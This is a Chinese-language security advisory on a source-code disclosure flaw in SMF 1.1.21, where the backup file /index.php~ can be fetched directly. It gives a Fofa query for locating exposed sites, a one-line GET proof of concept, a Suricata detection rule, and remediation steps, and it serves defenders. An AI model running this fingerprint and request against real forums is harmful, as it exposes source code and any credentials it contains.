# SMF 系统存在源码泄露漏洞

SMF 系统存在源码泄露漏洞

# 影响版本

**SMF 1.1.21**

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**Fofa:**  **body=&quot;Powered by SMF 1.1.21&quot;**

**POC/EXP：**

**step1** **源码泄露漏洞**

```
GET /index.php~ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive


```

​![image](assets/image-20260902003913-xvi1m7x.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"SMF系统 - /index.php~ 源码泄露漏洞 (Backup File Access)";
    flow:to_server,established;
    http.method; content:"GET";
    http.uri; content:"/index.php~"; fast_pattern;
    metadata:
        service http,
        affected_product "SMF (Simple Machines Forum)",
        vulnerability_type "Source Code Disclosure",
        severity "medium";
    classtype:attempted-recon;
    sid:1000752;
    rev:1;
    priority:3;
)
```

# 漏洞修复

* **首选方案：升级版本**。这是最彻底的解决方案，建议将SMF升级到**最新的稳定版本**，所有现代版本均已修复此问题。
* **临时加固措施（如无法升级）** ：

  1. **禁用目录列表**：在Web服务器（如Apache）中，确保已禁用目录列表功能。
  2. **配置访问权限**：通过 `.htaccess`​ 文件或服务器配置，**禁止对**  **​`~`​** ​ **结尾文件的访问**。
  3. **清理备份文件**：检查并删除服务器上所有以 `~`​ 结尾的冗余备份文件。

‍
